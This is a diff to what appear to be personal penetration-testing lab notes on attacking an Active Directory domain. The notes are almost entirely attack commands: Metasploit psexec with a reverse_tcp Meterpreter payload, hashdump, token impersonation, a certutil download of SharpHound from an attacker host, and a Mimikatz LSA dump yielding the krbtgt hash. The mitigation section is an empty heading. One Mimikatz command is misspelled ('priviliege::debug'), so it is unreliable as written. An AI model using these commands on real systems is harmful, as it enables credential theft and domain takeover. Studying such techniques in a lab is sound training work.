@@ -62,8 +62,19 @@ rotate passwords
 
 TOKEN IMPERSONATION
 
+msf6 exploit(windows/smb/psexec) > set target 2
+set payload windows/x64/meterpreter/reverse_tcp
+
+meterpreter > migrate 1388
+[*] Migrating from 4924 to 1388...
+[*] Migration completed successfully.
+meterpreter > hashdump
+sysinfo
+
+
 meterpreter> load incognito
 impersonate_token marvel\\fcastle
+shell
 whoami
 
 also, LSA dump
@@ -71,10 +82,14 @@ powershell -ep bypass
 certutil -urlcache -f http://192.168.0.27/SharpHound.ps1 SharpHound.ps1
 . .\SharpHound.ps1
 
+load mimikatz
+[!] The "mimikatz" extension has been replaced by "kiwi". Please use this in future.
 Invoke-Mimikatz -Command '"priviliege::debug" "LSADump::LSA /inject" exit' -Computer HYDRA.marvel.local
 kerberos hash -> RID + NTLM + User: krbtgt
 
 meterpreter > list_tokens -u
+
+MITIGATION FOR TOKEN IMPERSONATION
 
 
 
